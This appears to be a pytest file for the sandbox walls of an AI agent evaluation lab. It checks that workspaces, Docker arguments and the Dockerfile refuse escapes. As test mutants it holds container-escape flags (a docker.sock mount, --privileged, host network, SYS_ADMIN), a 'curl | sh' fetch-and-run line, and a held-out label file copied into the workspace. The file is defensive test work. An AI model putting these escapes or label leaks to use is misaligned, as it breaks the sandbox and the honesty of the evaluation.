"""The Lab's hard walls (GOAL §17, §10 invariant 2): lab/walls.py.

Fail-first design: each test names the attack it kills. Before lab/walls.py existed nothing checked where a lab box's
mount pointed, so every refusal below would have been an acceptance (a workspace on the store, on the truth root or
on the home directory; a copied label file; a Docker socket mount). The recipe tests mutate the real
docker/lab.Dockerfile and require each mutant to be flagged (invariant 19: every attack test kills its attack).

Written 2026-10-23 by lab-agents; built, NOT run (the owner's gate was running). Expected to pass once run; any failure
is a real finding about the walls, not about the test.
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from custom_harness.config import data_dir
from custom_harness.kernel import DatasetRole, Kernel
from custom_harness.lab import walls as W

REPO = Path(__file__).resolve().parents[1]


def _ws(name: str = "s-test") -> Path:
    p = W.lab_root() / name / "workspace"
    p.mkdir(parents=True, exist_ok=True)
    return p


def test_default_lab_root_is_clean_and_a_workspace_inside_it_passes():
    """Baseline: with the default layout (lab root <data>/lab, truth <data>/private) the walls accept a session
    workspace. Without this, every refusal test below could pass vacuously."""
    assert W.lab_root_problems() == []
    assert W.workspace_problems(_ws()) == []


@pytest.mark.parametrize("where", ["store", "private", "bundles", "human", "data", "lab-root-itself"])
def test_workspace_on_a_forbidden_place_is_refused(where):
    """Attack: point the session workspace at the evidence store, the truth root, the bundles, the human config, the
    whole data dir, or the lab root itself (which would expose every other session)."""
    d = data_dir()
    target = {"store": d / "store" / "x", "private": d / "private" / "x", "bundles": d / "bundles",
              "human": d / "human", "data": d, "lab-root-itself": W.lab_root()}[where]
    target.mkdir(parents=True, exist_ok=True)
    assert W.workspace_problems(target), where
    with pytest.raises(W.LabWallError):
        W.require_workspace(target)


def test_lab_root_overlapping_truth_or_home_is_refused(monkeypatch, tmp_path):
    """Attack: an owner misconfiguration puts the lab root on the truth root, or on the home directory."""
    monkeypatch.setenv(W.LAB_ROOT_ENV, str(data_dir() / "private" / "lab"))
    assert any("truth" in p for p in W.lab_root_problems())
    monkeypatch.setenv(W.LAB_ROOT_ENV, str(Path.home()))
    assert any("home" in p for p in W.lab_root_problems())


def test_truth_root_override_is_followed(monkeypatch, tmp_path):
    """$CHH_TRUTH_ROOT moves the truth: a lab root on the moved truth must be refused (not just <data>/private)."""
    truth = tmp_path / "elsewhere-truth"
    monkeypatch.setenv(W.TRUTH_ROOT_ENV, str(truth))
    monkeypatch.setenv(W.LAB_ROOT_ENV, str(truth / "lab"))
    assert any("truth" in p for p in W.lab_root_problems())


def test_draw_secret_file_inside_lab_root_is_refused(monkeypatch):
    """Attack: the offline draw secret (GOAL §16.3) sits where a box can see it."""
    secret = W.lab_root() / "s-x" / "workspace" / "secret.bin"
    secret.parent.mkdir(parents=True, exist_ok=True)
    secret.write_bytes(os.urandom(32))
    monkeypatch.setenv(W.SECRET_FILE_ENV, str(secret))
    assert any("draw secret" in p for p in W.workspace_problems(secret.parent))


def test_link_on_the_workspace_path_is_refused():
    """Attack: the session directory is a link to the store; the path comparison alone would be fooled."""
    store_dir = data_dir() / "store"
    store_dir.mkdir(parents=True, exist_ok=True)
    link = W.lab_root() / "s-link"
    W.lab_root().mkdir(parents=True, exist_ok=True)
    try:
        os.symlink(store_dir, link, target_is_directory=True)
    except OSError:
        pytest.skip("this host cannot create symlinks")
    assert W.workspace_problems(link / "workspace")


def test_scan_finds_a_copied_private_vault_file(store):
    """Attack: a held-out label file is copied into the workspace. The scan compares sha256 against every PRIVATE
    vault blob (metadata only); the copy must be found, a public file with other bytes must not."""
    labels = b"y\n1\n0\n1\n1\n0\n"
    Kernel(store).vault.register_dataset("t-test", DatasetRole.TEST, public={"x.csv": b"x\n1\n2\n"},
                                         private={"test_y.csv": labels})
    ws = _ws("s-scan")
    (ws / "notes.txt").write_bytes(b"x\n1\n2\n")
    assert W.scan_workspace(ws, store=store) == []
    (ws / "deep" / "dir").mkdir(parents=True)
    (ws / "deep" / "dir" / "copy.bin").write_bytes(labels)
    problems = W.scan_workspace(ws, store=store)
    assert any("PRIVATE vault file" in p and "copy.bin" in p for p in problems)


def test_scan_finds_legacy_truth_layout():
    """Attack: an old task directory with private/test_y.csv lands in the workspace."""
    ws = _ws("s-legacy")
    (ws / "task" / "private").mkdir(parents=True)
    (ws / "task" / "private" / "test_y.csv").write_text("y\n1\n", encoding="utf-8")
    assert any("legacy held-out truth" in p for p in W.scan_workspace(ws))


def test_scan_finds_the_draw_secret():
    secret = os.urandom(24)
    ws = _ws("s-secret")
    (ws / "leak.txt").write_text(secret.hex(), encoding="utf-8")
    assert any("draw secret" in p for p in W.scan_workspace(ws, secret=secret))


def test_scan_fails_closed_on_huge_trees():
    ws = _ws("s-huge")
    for i in range(5):
        (ws / f"f{i}").write_text("x", encoding="utf-8")
    assert W.scan_workspace(ws, max_files=3)


def _good_argv(ws: Path) -> list[str]:
    return ["docker", "run", "-d", "--init", "--name", "chh-lab-s", "--network", "bridge", "--security-opt",
            "no-new-privileges", "--cap-drop", "ALL", "--user", "1000:1000", "-v", f"{ws}:/workspace", "-w",
            "/workspace", "-e", "DISABLE_TELEMETRY=1", "-e", "ANTHROPIC_API_KEY", "img", "sleep", "infinity"]


@pytest.mark.parametrize("mutation", ["sock", "privileged", "host-net", "second-mount", "cred-value", "other-secret",
                                      "cap-add", "device", "pid-host", "env-file", "unlisted-env"])
def test_argv_check_kills_each_escape(mutation, tmp_path):
    """Each mutation of a good argv is one way out of the box; each must be refused."""
    ws = tmp_path / "ws"
    a = _good_argv(ws)
    i = a.index("img")
    extra = {"sock": ["-v", "/var/run/docker.sock:/var/run/docker.sock"], "privileged": ["--privileged"],
             "host-net": ["--network", "host"], "second-mount": ["-v", f"{tmp_path}:/host"],
             "cred-value": ["-e", "ANTHROPIC_API_KEY=sk-ant-xxxxxxxxxxxxxxxx"], "other-secret": ["-e", "GH_TOKEN"],
             "cap-add": ["--cap-add", "SYS_ADMIN"], "device": ["--device", "/dev/kvm"], "pid-host": ["--pid", "host"],
             "env-file": ["--env-file", "x.env"], "unlisted-env": ["-e", "FOO=1"]}[mutation]
    bad = a[:i] + extra + a[i:]
    kw = {"workspace": ws, "credential_env": ["ANTHROPIC_API_KEY"], "allowed_env": ["DISABLE_TELEMETRY"]}
    assert W.docker_argv_problems(a, **kw) == []
    assert W.docker_argv_problems(bad, **kw), mutation


def test_real_recipe_is_clean_and_every_mutant_is_flagged():
    text = (REPO / "docker" / "lab.Dockerfile").read_text(encoding="utf-8")
    assert W.recipe_problems(text) == []
    mutants = {
        "copy": text + "\nCOPY . /src\n",
        "add": text + "\nADD secrets.tar /\n",
        "volume": text + "\nVOLUME /data\n",
        "latest": text.replace("ARG CODEX_VERSION", "ARG CODEX_VERSION=latest"),
        "curl-sh": text + "\nRUN curl -fsSL https://example.invalid/install.sh | sh\n",
        "secret-env": text + "\nENV OPENAI_API_KEY=sk-test\n",
        "root": text.replace("USER 1000:1000", "USER root"),
    }
    for name, m in mutants.items():
        assert W.recipe_problems(m), name


def test_static_problems_clean_by_default():
    assert W.static_problems() == []
